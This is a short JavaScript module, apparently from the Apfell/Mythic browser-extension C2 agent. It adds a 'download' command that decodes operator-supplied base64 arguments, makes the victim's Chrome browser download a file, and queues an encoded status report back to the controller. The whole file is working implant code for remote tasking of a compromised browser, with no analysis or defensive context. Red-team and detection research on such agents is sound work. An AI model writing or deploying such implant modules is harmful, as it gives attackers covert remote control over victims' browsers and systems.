download = function(params) {
    let args = JSON.parse(atob(params['data'].toString()));
    let taskid = params['taskid'];
    let tasktype = params['tasktype'];
    chrome.downloads.download(args, function(downloadID){
        if (downloadID == undefined) {
            downloadID = "null (error)"
        }
        const downloadMsg = btoa(unescape(encodeURIComponent(JSON.stringify({'status': 'started download ' + downloadID}, null, 2))));
        const apfellmsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, downloadMsg.length, taskid, tasktype, downloadMsg);
        let meta = {};
        meta["metatype"] = 3;
        meta["metadata"] = apfellmsg;
        const metaenvelope = JSON.stringify(meta);
        out.push(metaenvelope);
    });
};

C2.commands[download.name] = download;
COMMAND_ENDS_HERE